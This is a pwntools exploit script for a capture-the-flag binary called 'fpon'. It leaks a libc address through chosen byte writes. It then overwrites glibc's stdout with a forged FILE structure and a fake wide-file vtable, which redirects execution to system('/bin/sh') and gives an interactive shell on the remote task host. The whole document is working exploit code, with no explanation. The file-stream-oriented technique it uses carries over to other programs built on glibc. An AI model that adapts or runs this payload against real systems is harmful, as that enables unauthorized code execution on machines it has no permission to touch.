#!/usr/bin/env python3

from pwn import *

elf = ELF("./fpon_patched")
ld = ELF("./ld-linux-x86-64.so.2")
libc = ELF('./libc.so.6')

context.binary = elf

def conn():
    if args.LOCAL:
        r = process([elf.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("baby_fpon.tasks.ctf.ad", 32176)

    return r


r = conn()

def send_byte(offset, byte):
    r.sendlineafter(b'Offset: ', str(offset).encode())
    r.sendlineafter(b'Byte: ', str(byte).encode())


send_byte(1, 24)
send_byte(32, 40)

leak_libc = r.recv(6)

leak_libc = u64(leak_libc.ljust(8, b'\x00'))

log.success(f'LIBC LEAK : {hex(leak_libc)}')

libc.address = leak_libc - libc.sym["_IO_2_1_stdin_"]

log.success(f'LIBC BASE@ {hex(libc.address)}')


stdout_lock = libc.address + 2176784
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18

gadget = libc.address + 0x000000000017de30 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

#print(bytes(fake))

#write(libc.sym['_IO_2_1_stdout_'], bytes(fake))

r.sendlineafter(b'Address: ', str(stdout).encode())
r.sendlineafter(b'Content: ', bytes(fake))

#r.sendline(b'id')

r.interactive()
